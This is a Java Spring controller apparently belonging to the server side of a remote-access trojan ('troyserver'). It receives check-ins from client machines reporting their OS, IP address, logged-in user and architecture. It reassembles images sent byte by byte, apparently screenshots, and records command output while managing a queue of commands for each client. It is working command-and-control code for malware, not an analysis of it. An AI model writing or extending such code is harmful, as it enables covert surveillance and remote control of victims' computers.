package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.entity.Client;
import ch.lebois.troyserver.data.entity.Image;
import ch.lebois.troyserver.data.entity.Message;
import ch.lebois.troyserver.data.repository.ClientRepository;
import ch.lebois.troyserver.data.repository.ImageRepository;
import ch.lebois.troyserver.data.repository.MessageRepository;
import ch.lebois.troyserver.service.ClientFieldService;
import ch.lebois.troyserver.service.DateService;
import ch.lebois.troyserver.service.ImageService;
import java.util.ArrayList;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping(value = "reciver/")
public class ServerReceiverController {

    private ArrayList<Byte> bytes = new ArrayList<>();

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;
    private ImageRepository imageRepository;

    private ImageService imageService;
    private DateService dateService;
    private ClientFieldService clientFieldService;

    private Client client;
    private Message imgLoader;

    public ServerReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
                                    ImageService imageService, ImageRepository imageRepository,
                                    DateService dateService, ClientFieldService clientFieldService) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
        this.imageService = imageService;
        this.imageRepository = imageRepository;
        this.dateService = dateService;
        this.clientFieldService = clientFieldService;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getInfo(@PathVariable(value = "client") String clientParam,
                          @RequestParam(name = "type", defaultValue = "") String typeParam,
                          @RequestParam(name = "value", defaultValue = "") String valueParam) {

        client = getClient(clientParam);

        switch (typeParam) {
            case "refresh":
                clientFieldService.setFieldValue(client, "refreshtime", valueParam);
                break;
            case "os":
                clientFieldService.setFieldValue(client, "os", valueParam);
                break;
            case "ip":
                clientFieldService.setFieldValue(client, "ip", valueParam);
                break;
            case "user":
                clientFieldService.setFieldValue(client, "pcuser", valueParam);
                break;
            case "arch":
                clientFieldService.setFieldValue(client, "arch", valueParam);
                break;
            case "online":
                break;
            case "img":
                addBytes(valueParam);
                clearCommands();
                break;
            case "imgSize":
                imgLoader = new Message();
                imgLoader.setPcNameFk(clientParam);
                imgLoader.setType("commandout");
                imgLoader.setText("");
                messageRepository.save(imgLoader);
                clearCommands();
                break;
            case "imgend":
                imgLoader = new Message();
                createMessage(clientParam, "commandout", "Creating Img");
                createMessage(clientParam, typeParam, "Saved img: " + createImg(clientParam));
                break;
            default:
                clearCommands();
                createMessage(clientParam, typeParam, valueParam);
                break;
        }
        lastSeen();
        return "receiver";
    }

    private void lastSeen() {
        clientFieldService.setFieldValue(client, "lastseen", dateService.getDate());
        clientRepository.save(client);
    }

    private Client getClient(String clientParam) {
        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            client = new Client();
            client.setPcName(clientParam);
            clientFieldService.setFieldValue(client, "nickname", clientParam);
            clientFieldService.setFieldValue(client, "refreshtime", "");
            clientRepository.save(client);
        }
        return client;
    }

    private void addBytes(String valueParam) {
        for (String s : valueParam.split("_")) {
            try {
                bytes.add(Byte.valueOf(s));
            } catch (NumberFormatException e) {
                System.out.println("Error with added Files");
            }
        }
    }

    private String createImg(String clientParam) {
        String fileName = imageService.getImage(bytes, clientParam);
        bytes = new ArrayList<>();

        Image image = new Image();
        image.setPcNameFk(clientParam);
        image.setName(fileName);
        imageRepository.save(image);
        return fileName;
    }

    private void clearCommands() {
        clientFieldService.setFieldValue(client, "command", "");
    }

    private void createMessage(String clientName, String messageType, String messageValue) {
        Message message = new Message();
        message.setPcNameFk(clientName);
        message.setType(messageType);
        message.setText(messageValue);
        messageRepository.save(message);
    }
}
